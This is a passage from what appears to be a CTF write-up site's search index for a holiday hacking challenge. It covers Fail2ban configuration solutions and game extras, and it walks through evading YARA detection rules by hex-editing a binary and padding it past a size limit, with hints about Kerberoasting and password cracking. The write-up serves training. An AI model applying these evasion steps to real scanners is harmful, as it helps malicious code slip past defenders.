troubleshooting shellcode can be difficult. Use the debugger step-by-step feature to watch values. Lastly, be careful not to overwrite any register values you need to reference later on in your shellcode. That's it! I know you can do it!","title":"Completion"},{"location":"challenges/T8_HoHo_No/","text":"HoHo ... No Terminal Challenge Elf Introduction Help Eve Snowshoes in Santa's Office Hey there, how's it going? I'm Eve Snowshoes. Lately I've been spending a lot of cycles worrying about what's going on next door. Before that, I was checking out Fail2Ban. It's this slick log scanning tool for Apache web servers. If you can complete this terminal challenge, I\u2019d be happy to give you some things I\u2019ve learned about Kerberoasting and Active Directory permissions! Why don't you do some work with Fail2Ban on this Cranberry Pi terminal first, then we\u2019ll talk Kerberoasting and Active Directory. OK? Hints and Other Resources Other Resources KringleCon Talk Automate Security Response by Creating Your Own \"Naughty Lists - Andy Smith Fail2ban Jails, Filters, and Actions https://www.fail2ban.org/wiki/index.php/MANUAL_0_8#General_settings Open the Terminal Open the HoHo ... No terminal in Santa's office Screenshot Solution To complete this objective we need to create three Fail2ban configuration files, a jail, a filter, and an action. Jail Configuration This file contains the basic configuration of the jail, referencing the filter, action, log to be processed, and criteria to trigger the action (the filter being evaluated as true 10 times every 60 minutes) /etc/fail2ban/jail.d/nutmeg-jail.conf [nutmeg-jail] enabled = true filter = nutmeg-filter action = nutmeg-action logpath = /var/log/hohono.log maxretry = 10 findtime = 60m Action Configuration This file contains the necessary actions to ban and unban an IP address as specified in the introduction. /etc/fail2ban/action.d/nutmeg-action.conf [Definition] actionban = /root/naughtylist add <ip> actionunban = /root/naughtylist del <ip> Filter Configuration Looking through the '/var/log/hohono.log' file we find that there are 4 types of entries in the fail that represent some kind of failure, which need to be added to the filter configuration file. /etc/fail2ban/filter.d/nutmeg-filter.conf [Definition] failregex = Failed login from <HOST> Login from <HOST> rejected due to unknown user name <HOST> sent a malformed request Invalid heartbeat .+ from <HOST>$ Note that while the last line in the filter could be written excluding the trailing '$', this character should be included to avoid the potential of malicious input as described in the KringleCon Talk Warning In the Action and Filter configuration files, \"Definition\" and \"ip\" must match the case shown here. Processing the log After creating the three files, restart Fail2ban and refresh the log service fail2ban restart /root/naughtylist refresh Screenshot Completion Talk to Eve to receive hints for Objective 8) Kerberoasting on an Open Fire Fantastic! Thanks for the help! Hey, would you like to know more about Kerberoasting and Active Directory permissions abuse? There's a great talk by Chris Davis on this exact subject! There are also plenty of resources available to learn more about Kerberoasting specifically. If you have any trouble finding a domain controller, remember that, when not running as root, nmap default probing relies on connecting to TCP 80 and 443. Got a hash that won't crack with your wordlist? OneRuleToRuleThemAll.rule is a great way to grow your keyspace. Where'd you get your wordlist? CeWL might generate a great wordlist from the ElfU website, but it will ignore digits in terms by default. So, apropos of nothing, have you ever known system administrators who store credentials in scripts? I know, I know, you understand the folly and would never do it! The easy way to investigate Active Directory misconfigurations (for Blue and Red alike!) is with Bloodhound , but there are native methods as well. Oh, and one last thing: once you've granted permissions to your user, it might take up to five minutes for it to propagate throughout the domain.","title":"Eve Snowshoes - HoHo No"},{"location":"challenges/T8_HoHo_No/#hoho-no-terminal-challenge","text":"","title":"HoHo ... No Terminal Challenge"},{"location":"challenges/T8_HoHo_No/#elf-introduction","text":"Help Eve Snowshoes in Santa's Office Hey there, how's it going? I'm Eve Snowshoes. Lately I've been spending a lot of cycles worrying about what's going on next door. Before that, I was checking out Fail2Ban. It's this slick log scanning tool for Apache web servers. If you can complete this terminal challenge, I\u2019d be happy to give you some things I\u2019ve learned about Kerberoasting and Active Directory permissions! Why don't you do some work with Fail2Ban on this Cranberry Pi terminal first, then we\u2019ll talk Kerberoasting and Active Directory. OK?","title":"Elf Introduction"},{"location":"challenges/T8_HoHo_No/#hints-and-other-resources","text":"Other Resources KringleCon Talk Automate Security Response by Creating Your Own \"Naughty Lists - Andy Smith Fail2ban Jails, Filters, and Actions https://www.fail2ban.org/wiki/index.php/MANUAL_0_8#General_settings","title":"Hints and Other Resources"},{"location":"challenges/T8_HoHo_No/#open-the-terminal","text":"Open the HoHo ... No terminal in Santa's office Screenshot","title":"Open the Terminal"},{"location":"challenges/T8_HoHo_No/#solution","text":"To complete this objective we need to create three Fail2ban configuration files, a jail, a filter, and an action.","title":"Solution"},{"location":"challenges/T8_HoHo_No/#jail-configuration","text":"This file contains the basic configuration of the jail, referencing the filter, action, log to be processed, and criteria to trigger the action (the filter being evaluated as true 10 times every 60 minutes) /etc/fail2ban/jail.d/nutmeg-jail.conf [nutmeg-jail] enabled = true filter = nutmeg-filter action = nutmeg-action logpath = /var/log/hohono.log maxretry = 10 findtime = 60m","title":"Jail Configuration"},{"location":"challenges/T8_HoHo_No/#action-configuration","text":"This file contains the necessary actions to ban and unban an IP address as specified in the introduction. /etc/fail2ban/action.d/nutmeg-action.conf [Definition] actionban = /root/naughtylist add <ip> actionunban = /root/naughtylist del <ip>","title":"Action Configuration"},{"location":"challenges/T8_HoHo_No/#filter-configuration","text":"Looking through the '/var/log/hohono.log' file we find that there are 4 types of entries in the fail that represent some kind of failure, which need to be added to the filter configuration file. /etc/fail2ban/filter.d/nutmeg-filter.conf [Definition] failregex = Failed login from <HOST> Login from <HOST> rejected due to unknown user name <HOST> sent a malformed request Invalid heartbeat .+ from <HOST>$ Note that while the last line in the filter could be written excluding the trailing '$', this character should be included to avoid the potential of malicious input as described in the KringleCon Talk Warning In the Action and Filter configuration files, \"Definition\" and \"ip\" must match the case shown here.","title":"Filter Configuration"},{"location":"challenges/T8_HoHo_No/#processing-the-log","text":"After creating the three files, restart Fail2ban and refresh the log service fail2ban restart /root/naughtylist refresh Screenshot","title":"Processing the log"},{"location":"challenges/T8_HoHo_No/#completion","text":"Talk to Eve to receive hints for Objective 8) Kerberoasting on an Open Fire Fantastic! Thanks for the help! Hey, would you like to know more about Kerberoasting and Active Directory permissions abuse? There's a great talk by Chris Davis on this exact subject! There are also plenty of resources available to learn more about Kerberoasting specifically. If you have any trouble finding a domain controller, remember that, when not running as root, nmap default probing relies on connecting to TCP 80 and 443. Got a hash that won't crack with your wordlist? OneRuleToRuleThemAll.rule is a great way to grow your keyspace. Where'd you get your wordlist? CeWL might generate a great wordlist from the ElfU website, but it will ignore digits in terms by default. So, apropos of nothing, have you ever known system administrators who store credentials in scripts? I know, I know, you understand the folly and would never do it! The easy way to investigate Active Directory misconfigurations (for Blue and Red alike!) is with Bloodhound , but there are native methods as well. Oh, and one last thing: once you've granted permissions to your user, it might take up to five minutes for it to propagate throughout the domain.","title":"Completion"},{"location":"challenges/T9_Yara_Analysis/","text":"Yara Analysis Terminal Challenge Elf Introduction Help Fitzy Shortstack in the KringleCon Entry Hiya, I'm Fitzy Shortstack! I was just trying to learn a bit more about YARA with this here Cranberry Pi terminal. I mean, I'm not saying I'm worried about attack threats from that other con next door, but... OK. I AM worried. I've been thinking a bit about how malware might bypass YARA rules. If you can help me solve the issue in this terminal, I\u2019ll understand YARA so much better! Would you please check it out so I can learn? And, I\u2019ll tell you what \u2013 if you help me with YARA, I\u2019ll give you some tips for Splunk! I think if you make small, innocuous changes to the executable, you can get it to run in spite of the YARA rules. Hints and Other Resources Other Resources Yara Documentation https://yara.readthedocs.io/en/stable/ Editing binary files with vim https://transang.me/edit-binary-file-with-vim-and-the-xxd-command/ Open the Terminal Open the Yara Analysis terminal in the KringleCon Entry Screenshot Solution Looking at the files after logging in we see that 'the_critical_elf_app' is in our home directory, along with a 'yara_rules' directory containing a 'rules.yara' file. Screenshot The first Yara rule Running ./the_critical_elf_app triggers the first yara rule, #135. Screenshot So we edit the file 'yara_rules/rules.yara' and locate rule 135. rule yara_rule_135 { meta: description = \"binaries - file Sugar_in_the_machinery\" author = \"Sparkle Redberry\" reference = \"North Pole Malware Research Lab\" date = \"1955-04-21\" hash = \"19ecaadb2159b566c39c999b0f860b4d8fc2824eb648e275f57a6dbceaf9b488\" strings: $s = \"candycane\" condition: $s } The rules file cannot be modified, so instead we need to modify 'the_critical_elf_app' in some way to prevent this rule from evaluating as true. The condition the rule is looking for the string \"candycane\". Editing 'the_critical_elf_app' with vim (or any other editor) we see that it is a binary file. But it is possible to edit binary files with vim by using the xxd utility. Open the file with vim the_critical_elf_app Convert the binary file to a hex readable format with the vim command :%!xxd Screenshot Now we can search the file for what we want to change Screenshot Edit the hex (left) portion of the file. Note that we are not using an actual hex editor, so the ASCII text on the right of the screen will not change. Screenshot Convert the file back to binary with the vim command :%!xxd -r , Save and exit using :wq! The second Yara rule This time when we run ./the_critical_elf_app , we trigger Yara rule 1056. Screenshot rule yara_rule_1056 { meta: description = \"binaries - file frosty.exe\" author = \"Sparkle Redberry\" reference = \"North Pole Malware Research Lab\" date = \"1955-04-21\" hash = \"b9b95f671e3d54318b3fd4db1ba3b813325fcef462070da163193d7acb5fcd03\" strings: $s1 = {6c 6962 632e 736f 2e36} $hs2 = {726f 6772 616d 2121} condition: all of them } This rule is triggering on two hex strings represented by the variables $s1 and $hs2. Translating the two strings from hex using Cyber Chef we learn that $s1=\"libc.so.6\" $hs2=\"rogram!!\" It's likely that modifying the string in the application that refers to the GNU C library will break the application, but as the rule requires that both strings are present we can prevent the rule from triggering by changing the other one. Following the same steps as before we again open the file in vim, convert it from binary using xxd, edit it, convert it back to binary, and save it. Screenshot The third Yara rule Again, we run ./the_critical_elf_app and find that rule #1732 is triggering. Screenshot rule yara_rule_1732 { meta: description = \"binaries - alwayz_winter.exe\" author = \"Santa\" reference = \"North Pole Malware Research Lab\" date = \"1955-04-22\" hash = \"c1e31a539898aab18f483d9e7b3c698ea45799e78bddc919a7dbebb1b40193a8\" strings: $s1 = \"This is critical for the execution of this program!!\" fullword ascii $s2 = \"__frame_dummy_init_array_entry\" fullword ascii $s3 = \".note.gnu.property\" fullword ascii $s4 = \".eh_frame_hdr\" fullword ascii $s5 = \"__FRAME_END__\" fullword ascii $s6 = \"__GNU_EH_FRAME_HDR\" fullword ascii $s7 = \"frame_dummy\" fullword ascii $s8 = \".note.gnu.build-id\" fullword ascii $s9 = \"completed.8060\" fullword ascii $s10 = \"_IO_stdin_used\" fullword ascii $s11 = \".note.ABI-tag\" fullword ascii $s12 = \"naughty string\" fullword ascii $s13 = \"dastardly string\" fullword ascii $s14 = \"__do_global_dtors_aux_fini_array_entry\" fullword ascii $s15 = \"__libc_start_main@@GLIBC_2.2.5\" fullword ascii $s16 = \"GLIBC_2.2.5\" fullword ascii $s17 = \"its_a_holly_jolly_variable\" fullword ascii $s18 = \"__cxa_finalize\" fullword ascii $s19 = \"HolidayHackChallenge{NotReallyAFlag}\" fullword ascii $s20 = \"__libc_csu_init\" fullword ascii condition: uint32(1) == 0x02464c45 and filesize < 50KB and 10 of them } This is a more complicated rule. The condition consists of 3 parts The first condition matches if there is a 32 bit unsigned integer, in little-endian format, at position 1 of the file matching the hex value 0x02464c45. This is the first set of bytes that occur in an ELF (Executable and Linkable Format) file, so we have no option to change this. The second condition is a requirement that the file be less than 50KB in size. The third condition is that 10 of the 20 defined strings are found in the file. Looking through the strings it might be possible to edit the binary as we did before to remove 11 of the 20 strings specified, but there is an easier way. ELF binary files can have NULL characters appended to the end of them without affecting their execution. As we saw when we first inspected the files on the system, 'the_critical_elf_app' is 16,689 bytes in length. We can extend the file by 35KB with the truncate command. truncate -s +35k the_critical_elf_app Now that the file is larger than 50k in size it will run. Screenshot Completion Talk to Fitzy after getting the application to run to receive hints for Objective 9) Splunk! Thanks - you figured it out! Let me tell you what I know about Splunk. Did you know Splunk recently added support for new data sources including Sysmon for Linux and GitHub Audit Log data? Between GitHub audit log and webhook event recording, you can monitor all activity in a repository, including common git commands such as git add, git status, and git commit. You can also see cloned GitHub projects. There's a lot of interesting stuff out there. Did you know there are repositories of code that are Darn Vulnerable? Sysmon provides a lot of valuable data, but sometimes correlation across data types is still necessary. Sysmon network events don't reveal the process parent ID for example. Fortunately, we can pivot with a query to investigate process creation events once you get a process ID. Sometimes Sysmon data collection is awkward. Pipelining multiple commands generates multiple Sysmon events, for example. Did you know there are multiple versions of the Netcat command that can be used maliciously? nc.openbsd, for example.","title":"Fitzy Shortstack - Yara Analysis"},{"location":"challenges/T9_Yara_Analysis/#yara-analysis-terminal-challenge","text":"","title":"Yara Analysis Terminal Challenge"},{"location":"challenges/T9_Yara_Analysis/#elf-introduction","text":"Help Fitzy Shortstack in the KringleCon Entry Hiya, I'm Fitzy Shortstack! I was just trying to learn a bit more about YARA with this here Cranberry Pi terminal. I mean, I'm not saying I'm worried about attack threats from that other con next door, but... OK. I AM worried. I've been thinking a bit about how malware might bypass YARA rules. If you can help me solve the issue in this terminal, I\u2019ll understand YARA so much better! Would you please check it out so I can learn? And, I\u2019ll tell you what \u2013 if you help me with YARA, I\u2019ll give you some tips for Splunk! I think if you make small, innocuous changes to the executable, you can get it to run in spite of the YARA rules.","title":"Elf Introduction"},{"location":"challenges/T9_Yara_Analysis/#hints-and-other-resources","text":"Other Resources Yara Documentation https://yara.readthedocs.io/en/stable/ Editing binary files with vim https://transang.me/edit-binary-file-with-vim-and-the-xxd-command/","title":"Hints and Other Resources"},{"location":"challenges/T9_Yara_Analysis/#open-the-terminal","text":"Open the Yara Analysis terminal in the KringleCon Entry Screenshot","title":"Open the Terminal"},{"location":"challenges/T9_Yara_Analysis/#solution","text":"Looking at the files after logging in we see that 'the_critical_elf_app' is in our home directory, along with a 'yara_rules' directory containing a 'rules.yara' file. Screenshot","title":"Solution"},{"location":"challenges/T9_Yara_Analysis/#the-first-yara-rule","text":"Running ./the_critical_elf_app triggers the first yara rule, #135. Screenshot So we edit the file 'yara_rules/rules.yara' and locate rule 135. rule yara_rule_135 { meta: description = \"binaries - file Sugar_in_the_machinery\" author = \"Sparkle Redberry\" reference = \"North Pole Malware Research Lab\" date = \"1955-04-21\" hash = \"19ecaadb2159b566c39c999b0f860b4d8fc2824eb648e275f57a6dbceaf9b488\" strings: $s = \"candycane\" condition: $s } The rules file cannot be modified, so instead we need to modify 'the_critical_elf_app' in some way to prevent this rule from evaluating as true. The condition the rule is looking for the string \"candycane\". Editing 'the_critical_elf_app' with vim (or any other editor) we see that it is a binary file. But it is possible to edit binary files with vim by using the xxd utility. Open the file with vim the_critical_elf_app Convert the binary file to a hex readable format with the vim command :%!xxd Screenshot Now we can search the file for what we want to change Screenshot Edit the hex (left) portion of the file. Note that we are not using an actual hex editor, so the ASCII text on the right of the screen will not change. Screenshot Convert the file back to binary with the vim command :%!xxd -r , Save and exit using :wq!","title":"The first Yara rule"},{"location":"challenges/T9_Yara_Analysis/#the-second-yara-rule","text":"This time when we run ./the_critical_elf_app , we trigger Yara rule 1056. Screenshot rule yara_rule_1056 { meta: description = \"binaries - file frosty.exe\" author = \"Sparkle Redberry\" reference = \"North Pole Malware Research Lab\" date = \"1955-04-21\" hash = \"b9b95f671e3d54318b3fd4db1ba3b813325fcef462070da163193d7acb5fcd03\" strings: $s1 = {6c 6962 632e 736f 2e36} $hs2 = {726f 6772 616d 2121} condition: all of them } This rule is triggering on two hex strings represented by the variables $s1 and $hs2. Translating the two strings from hex using Cyber Chef we learn that $s1=\"libc.so.6\" $hs2=\"rogram!!\" It's likely that modifying the string in the application that refers to the GNU C library will break the application, but as the rule requires that both strings are present we can prevent the rule from triggering by changing the other one. Following the same steps as before we again open the file in vim, convert it from binary using xxd, edit it, convert it back to binary, and save it. Screenshot","title":"The second Yara rule"},{"location":"challenges/T9_Yara_Analysis/#the-third-yara-rule","text":"Again, we run ./the_critical_elf_app and find that rule #1732 is triggering. Screenshot rule yara_rule_1732 { meta: description = \"binaries - alwayz_winter.exe\" author = \"Santa\" reference = \"North Pole Malware Research Lab\" date = \"1955-04-22\" hash = \"c1e31a539898aab18f483d9e7b3c698ea45799e78bddc919a7dbebb1b40193a8\" strings: $s1 = \"This is critical for the execution of this program!!\" fullword ascii $s2 = \"__frame_dummy_init_array_entry\" fullword ascii $s3 = \".note.gnu.property\" fullword ascii $s4 = \".eh_frame_hdr\" fullword ascii $s5 = \"__FRAME_END__\" fullword ascii $s6 = \"__GNU_EH_FRAME_HDR\" fullword ascii $s7 = \"frame_dummy\" fullword ascii $s8 = \".note.gnu.build-id\" fullword ascii $s9 = \"completed.8060\" fullword ascii $s10 = \"_IO_stdin_used\" fullword ascii $s11 = \".note.ABI-tag\" fullword ascii $s12 = \"naughty string\" fullword ascii $s13 = \"dastardly string\" fullword ascii $s14 = \"__do_global_dtors_aux_fini_array_entry\" fullword ascii $s15 = \"__libc_start_main@@GLIBC_2.2.5\" fullword ascii $s16 = \"GLIBC_2.2.5\" fullword ascii $s17 = \"its_a_holly_jolly_variable\" fullword ascii $s18 = \"__cxa_finalize\" fullword ascii $s19 = \"HolidayHackChallenge{NotReallyAFlag}\" fullword ascii $s20 = \"__libc_csu_init\" fullword ascii condition: uint32(1) == 0x02464c45 and filesize < 50KB and 10 of them } This is a more complicated rule. The condition consists of 3 parts The first condition matches if there is a 32 bit unsigned integer, in little-endian format, at position 1 of the file matching the hex value 0x02464c45. This is the first set of bytes that occur in an ELF (Executable and Linkable Format) file, so we have no option to change this. The second condition is a requirement that the file be less than 50KB in size. The third condition is that 10 of the 20 defined strings are found in the file. Looking through the strings it might be possible to edit the binary as we did before to remove 11 of the 20 strings specified, but there is an easier way. ELF binary files can have NULL characters appended to the end of them without affecting their execution. As we saw when we first inspected the files on the system, 'the_critical_elf_app' is 16,689 bytes in length. We can extend the file by 35KB with the truncate command. truncate -s +35k the_critical_elf_app Now that the file is larger than 50k in size it will run. Screenshot","title":"The third Yara rule"},{"location":"challenges/T9_Yara_Analysis/#completion","text":"Talk to Fitzy after getting the application to run to receive hints for Objective 9) Splunk! Thanks - you figured it out! Let me tell you what I know about Splunk. Did you know Splunk recently added support for new data sources including Sysmon for Linux and GitHub Audit Log data? Between GitHub audit log and webhook event recording, you can monitor all activity in a repository, including common git commands such as git add, git status, and git commit. You can also see cloned GitHub projects. There's a lot of interesting stuff out there. Did you know there are repositories of code that are Darn Vulnerable? Sysmon provides a lot of valuable data, but sometimes correlation across data types is still necessary. Sysmon network events don't reveal the process parent ID for example. Fortunately, we can pivot with a query to investigate process creation events once you get a process ID. Sometimes Sysmon data collection is awkward. Pipelining multiple commands generates multiple Sysmon events, for example. Did you know there are multiple versions of the Netcat command that can be used maliciously? nc.openbsd, for example.","title":"Completion"},{"location":"extras/O11_Customer_Complaint_Analysis/","text":"Extra content for Objective 11) Customer Complaint Analysis All the complaints The pcap file for the objective contains 16 submissions to the customer complaint system. If we use the Wireshark filter http.request.method == POST then we will get all 16 submissions and can read through each of them in the same way that we did to complete the main objective. Another method would be to use the tshark command line utility to output just the form data for each POST packet. tshark -r jackfrosttower-network.pcap -Y \"http.request.method == \"POST\"\" -T fields -e urlencoded-form.value All complaint submissions are listed in the table below. Name Troll ID Guest Info Description Klug 2234 Funny looking man in room 1145 I carry suitcase to room. Throw bag at bed and miss a little. Man is angry. He say suitcase is scuff. I say his face is scuff. He is more angry and I get no tip. Gavk 2354 Annoying woman in room 1239 Woman call desk and complain that room is cold. I go to room, knock on door, and tell her nice that I eat beans at lunch and can warm room up. She slam door in Gavk face. So mean. Bluk 2367 Boring humans in room 1128 I bring room service order. Use key card to go in. Woman getting undress. She scream and throw shoe at me. Shoe is tasty, but it not make up for her hurt my ears with scream. Euuk 1973 Ugly, mean couple in room 1032 Euuk do an innocent \"crop dust\" in elevator as it reach ground floor. No biggie - everyone do this sometimes. Couple get in. Begin to retch. Look at me with mean-type nastiness. I have bad feels. Crag 2351 Bald man in room 1212 Crag get in elevator. Man get in too. Crag push ALL buttons. Crag giggle because is funny joke. Man is no thinking funny. He has bad humor. He call Crag \"unthinking brute.\" Crag is not brute. Urgh 2633 Stupid man in room 1215 Bring drink to man at slot machine. Spill it on him a little. Urgh go to lick it off of him and he is angry. Say his is \"shock\" at Urgh behavior and lick is a bad idea. He is silly and mean. Yaqh 2796 Snooty lady in room 1024 Lady call desk and ask for more towel. Yaqh take to room. Yaqh ask if she want more towel because she is like to steal. She say Yaqh is insult. Yaqh is not insult. Yaqh is Yaqh. Flud 2083 Very cranky lady in room 1024 Lady call front desk. Complain \"employee\" is rude. Say she is insult and want to speak to manager. Send Flud to room. Lady say troll call her towels thief. I say stop steal towels if is bother her. Hagg 2013 Incredibly angry lady in room 1024 Lady call front desk. I am walk by so I pick up phone. She is ANGRY and shout at me. Say she has never been so insult. I say she probably has but just didn't hear it. Muffy VonDuchess Sebastian I don't know. There were several of them. Room 1024 I have never, in my life, been in a facility with such a horrible staff. They are rude and insulting. What kind of place is this? You can be sure that I (or my lawyer) will be speaking directly with Mr. Frost! Quib 2539 Ugly little man in room 1121 He call desk and say his shoes need shine. He leave outside door. I go and get. I spit shine. One spot on shoes is bad so I lick a little. Quite tasty. I accidental eat shoe. I take other shoe back. I am proud I no eat. He is mean at me. Bloz 2323 Nasty bad woman in room 1125 Bloz have tacos for lunch. Later, Bloz have very bad tummy and need to use potty immediate. Use key card on room on 11 floor. Bloz in bathroom doing business. Lady come in and scream. Bloz business quick done. She is rude. Wuuk 2987 Very crabby woman in room 1125 Lady call desk and say toilet plug. Wuuk take plunger and go to room. Wuuk make innocent comment that lady poop like troll and say Wuuk is \"outrageous.\" Does that mean handsome? Kraq 2383 Rude couple in room 1117 Kraq make teensy comment about man having bad toupee. Turn out it is not toupee. Kraq stand by comment - man have hair look like bad toupee. Man is angry and call Kraq many bad word. Kraq is just a pawn in great game of life. Ikky 2743 Family in room 1226 Lady is sit in lobby holding wonderfully ugly doll. Ikky like ugly doll and ask where she get. Ikky use to decorate for Halloween. She get angry because is her baby. She say \"I never!\" Ikky say she must have at least once. Stuv 2833 Grumpy man in room 1119 Man call front desk to complain about room be stuffy. Stuv say he is happy to get man and throw outside. Lot's of fresh air. And polar bears.","title":"Extra Content for Customer Complaint Analysis"},{"location":"extras/O11_Customer_Complaint_Analysis/#extra-content-for-objective-11-customer-complaint-analysis","text":"","title":"Extra content for Objective 11) Customer Complaint Analysis"},{"location":"extras/O11_Customer_Complaint_Analysis/#all-the-complaints","text":"The pcap file for the objective contains 16 submissions to the customer complaint system. If we use the Wireshark filter http.request.method == POST then we will get all 16 submissions and can read through each of them in the same way that we did to complete the main objective. Another method would be to use the tshark command line utility to output just the form data for each POST packet. tshark -r jackfrosttower-network.pcap -Y \"http.request.method == \"POST\"\" -T fields -e urlencoded-form.value All complaint submissions are listed in the table below. Name Troll ID Guest Info Description Klug 2234 Funny looking man in room 1145 I carry suitcase to room. Throw bag at bed and miss a little. Man is angry. He say suitcase is scuff. I say his face is scuff. He is more angry and I get no tip. Gavk 2354 Annoying woman in room 1239 Woman call desk and complain that room is cold. I go to room, knock on door, and tell her nice that I eat beans at lunch and can warm room up. She slam door in Gavk face. So mean. Bluk 2367 Boring humans in room 1128 I bring room service order. Use key card to go in. Woman getting undress. She scream and throw shoe at me. Shoe is tasty, but it not make up for her hurt my ears with scream. Euuk 1973 Ugly, mean couple in room 1032 Euuk do an innocent \"crop dust\" in elevator as it reach ground floor. No biggie - everyone do this sometimes. Couple get in. Begin to retch. Look at me with mean-type nastiness. I have bad feels. Crag 2351 Bald man in room 1212 Crag get in elevator. Man get in too. Crag push ALL buttons. Crag giggle because is funny joke. Man is no thinking funny. He has bad humor. He call Crag \"unthinking brute.\" Crag is not brute. Urgh 2633 Stupid man in room 1215 Bring drink to man at slot machine. Spill it on him a little. Urgh go to lick it off of him and he is angry. Say his is \"shock\" at Urgh behavior and lick is a bad idea. He is silly and mean. Yaqh 2796 Snooty lady in room 1024 Lady call desk and ask for more towel. Yaqh take to room. Yaqh ask if she want more towel because she is like to steal. She say Yaqh is insult. Yaqh is not insult. Yaqh is Yaqh. Flud 2083 Very cranky lady in room 1024 Lady call front desk. Complain \"employee\" is rude. Say she is insult and want to speak to manager. Send Flud to room. Lady say troll call her towels thief. I say stop steal towels if is bother her. Hagg 2013 Incredibly angry lady in room 1024 Lady call front desk. I am walk by so I pick up phone. She is ANGRY and shout at me. Say she has never been so insult. I say she probably has but just didn't hear it. Muffy VonDuchess Sebastian I don't know. There were several of them. Room 1024 I have never, in my life, been in a facility with such a horrible staff. They are rude and insulting. What kind of place is this? You can be sure that I (or my lawyer) will be speaking directly with Mr. Frost! Quib 2539 Ugly little man in room 1121 He call desk and say his shoes need shine. He leave outside door. I go and get. I spit shine. One spot on shoes is bad so I lick a little. Quite tasty. I accidental eat shoe. I take other shoe back. I am proud I no eat. He is mean at me. Bloz 2323 Nasty bad woman in room 1125 Bloz have tacos for lunch. Later, Bloz have very bad tummy and need to use potty immediate. Use key card on room on 11 floor. Bloz in bathroom doing business. Lady come in and scream. Bloz business quick done. She is rude. Wuuk 2987 Very crabby woman in room 1125 Lady call desk and say toilet plug. Wuuk take plunger and go to room. Wuuk make innocent comment that lady poop like troll and say Wuuk is \"outrageous.\" Does that mean handsome? Kraq 2383 Rude couple in room 1117 Kraq make teensy comment about man having bad toupee. Turn out it is not toupee. Kraq stand by comment - man have hair look like bad toupee. Man is angry and call Kraq many bad word. Kraq is just a pawn in great game of life. Ikky 2743 Family in room 1226 Lady is sit in lobby holding wonderfully ugly doll. Ikky like ugly doll and ask where she get. Ikky use to decorate for Halloween. She get angry because is her baby. She say \"I never!\" Ikky say she must have at least once. Stuv 2833 Grumpy man in room 1119 Man call front desk to complain about room be stuffy. Stuv say he is happy to get man and throw outside. Lot's of fresh air. And polar bears.","title":"All the complaints"},{"location":"extras/O12_Frost_Tower_Website_Checkup/","text":"Extra content for Objective 12) Frost Tower Website Checkup Jack's TODO List ID Note Completed 1 Buy up land all around Santa's Castle 1 2 Build bigger and more majestic tower next to Santa's 1 3 Erode Santa's influence at the North Pole via FrostFest, the greatest Con in history 1 4 Dishearten Santa's elves and encourage defection to our cause 0 5 Steal Santa's sleigh technology and build a competing and way better Frosty present delivery vehicle 0 6 Undermine Santa's ability to deliver presents on 12/24 through elf staff shortages, technology glitches, and assorted mayhem 0 7 Force Santa to cancel Christmas 0 8 SAVE THE DAY by delivering Frosty presents using merch from the Frost Tower Gift Shop to children world-wide... so the whole world sees that Frost saved the Holiday Season!!!! Bwahahahahaha! 0 9 With Santa defeated, offer the old man a job as a clerk in the Frost Tower Gift Shop so we can keep an eye on him 0","title":"Extra Content for Frost Tower Website Checkup"},{"location":"extras/O12_Frost_Tower_Website_Checkup/#extra-content-for-objective-12-frost-tower-website-checkup","text":"","title":"Extra content for Objective 12) Frost Tower Website Checkup"},{"location":"extras/O12_Frost_Tower_Website_Checkup/#jacks-todo-list","text":"ID Note Completed 1 Buy up land all around Santa's Castle 1 2 Build bigger and more majestic tower next to Santa's 1 3 Erode Santa's influence at the North Pole via FrostFest, the greatest Con in history 1 4 Dishearten Santa's elves and encourage defection to our cause 0 5 Steal Santa's sleigh technology and build a competing and way better Frosty present delivery vehicle 0 6 Undermine Santa's ability to deliver presents on 12/24 through elf staff shortages, technology glitches, and assorted mayhem 0 7 Force Santa to cancel Christmas 0 8 SAVE THE DAY by delivering Frosty presents using merch from the Frost Tower Gift Shop to children world-wide... so the whole world sees that Frost saved the Holiday Season!!!! Bwahahahahaha! 0 9 With Santa defeated, offer the old man a job as a clerk in the Frost Tower Gift Shop so we can keep an eye on him 0","title":"Jack's TODO List"},{"location":"extras/O2_Where_in_the_World_is_Caramel_Santaigo/","text":"Extra content for Objective 2) Where in the World is Caramel Santaigo All Location Hints This table lists all the possible locations along with the investigation hints that lead to them, in case you want to play without performing any OSINIT analysis. Location Guide Hints Antwerp, Belgium Their next waypoint was something like 51.219, 4.402 They just contacted us from an address in the 81.244.0.0/14 range. 5.0C and patchy light rain. Copenhagen, Denmark The elf wanted to drink gl\u00f8gg in Tivoli Gardens. Image of a green elf with EXIF GPS coordinates (55.684685, 12.579486) 0.0C and light snow conditions. Edinburgh, Scotland I'm not sure what a hogmanay is, but that elf wants to experience one just after Christmas. Image of a pink elf with EXIF GPS coordinates (55.948570, -3.199920) 6.0 C and moderate rain conditions. London, England They said, if asked, they would describe their next location in three words as \"frozen, push, and tamed.\" They were checking the Ofcom frequency table to see what amateur frequencies they could use while there. 11.0C and overcast conditions. Montreal, Canada I think they left to check out the D\u00e9fil\u00e9 de No\u00ebl. They called me and mentioned they were connected via Rogers Wireless. -12.0C and sunny conditions. New York, USA Buddy, a close friend of the elves, once went on an ice skating date under their huge Christmas tree! Image of a blue elf with EXIF GPS coordinates (40.758634, -73.978421) 1.7C and partly cloudy conditions Prague, Czech Republic They were excited about checking out the V\u00e1no\u010dn\u00ed trhy. They said something about NATO and 33U VR 58560 48464. /shrug 0.0C and partly cloudy conditions Reykjavik, Iceland They said, if asked, they would describe their next location as \"staring desire frost.\" Having trouble typing that letter? It's UNICODE 00ED or 0237 on the number pad in Windows. 0.0C and clear conditions Rovaniemi, Finland I've heard that when British children put letters to Father Christmas in the fireplace, they magically end up there! They just contacted us from an address in the 80.95.128.0/20 range. -11.0C and clear conditions Stuttgart, Germany They said something about MGRS and 32U NU 05939 98268... Apparently they really wanted to see what a town hall looks like when it's converted into a giant Advent calendar! 7.0C and clear conditions. Tokyo, Japan They said, if asked, they would describe their next location as \"only milder vanilla.\" They were excited that their phone was going to work on the 1500 MHz LTE band 7.0C and partly cloudy conditions Vienna, Austria They said they wanted to visit Christmas markets - like Christkindlmarkt and Spittelberg, enjoy fried sausages and goulash soup, and drink hot Christmas punch. They just contacted us from an address in the 137.208.0.0/16 range -2.0C and partly cloudy conditions","title":"Extra Content for Where in the World is Caramel Santaigo"},{"location":"extras/O2_Where_in_the_World_is_Caramel_Santaigo/#extra-content-for-objective-2-where-in-the-world-is-caramel-santaigo","text":"","title":"Extra content for Objective 2) Where in the World is Caramel Santaigo"},{"location":"extras/O2_Where_in_the_World_is_Caramel_Santaigo/#all-location-hints","text":"This table lists all the possible locations along with the investigation hints that lead to them, in case you want 